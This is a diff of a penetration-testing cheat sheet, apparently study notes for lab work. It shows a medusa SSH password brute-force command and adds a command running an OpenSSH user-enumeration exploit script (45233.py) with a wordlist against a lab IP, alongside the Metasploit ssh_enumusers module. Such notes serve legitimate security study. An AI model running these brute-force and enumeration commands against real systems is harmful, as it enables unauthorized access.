@@ -103,9 +103,13 @@ medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 10.10.10.10 - 22 -M 
 
 OpenSSH 2.3 - 7.7 has an enumerate users exploit.
 
-`auxiliary/scanner/ssh/ssh_enumusers`
+```
+python 45233.py --userList /usr/share/wordlists/metasploit/unix_users.txt 10.11.1.44 --outputFile ssh-users2
+```
 
-https://www.exploit-db.com/exploits/45233/
+```
+auxiliary/scanner/ssh/ssh_enumusers
+```
 
 #### 23: Telnet
 
